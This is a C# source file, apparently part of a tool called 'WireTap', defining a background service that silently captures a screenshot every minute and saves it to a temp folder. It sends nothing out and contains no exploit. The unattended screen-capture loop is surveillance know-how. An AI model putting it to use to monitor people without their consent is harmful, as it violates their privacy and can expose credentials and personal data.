namespace WireTap.HostedService
{
    using Microsoft.Extensions.Hosting;
    using System;
    using System.Threading;
    using System.Threading.Tasks;

    internal class ScreenshotService : ServiceBase, IHostedService
    {
        protected override async Task InternalExecuteAsync(CancellationToken cancellationToken)
        {
            Console.WriteLine("ScreenshotService : StartScreenshotServiceAsync");

            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    Console.WriteLine("ScreenshotService : Inside captureScreenshot");
                    var filename = Helpers.CreateTempFileName(".jpeg", "screenshot-", "screenshot");
                    Display.CaptureImage(filename);
                    Console.WriteLine("ScreenshotService : [+] Screenshot captured at: {0}", filename);
                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message + '\n' + ex.StackTrace);
                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
            }
        }
    }
}
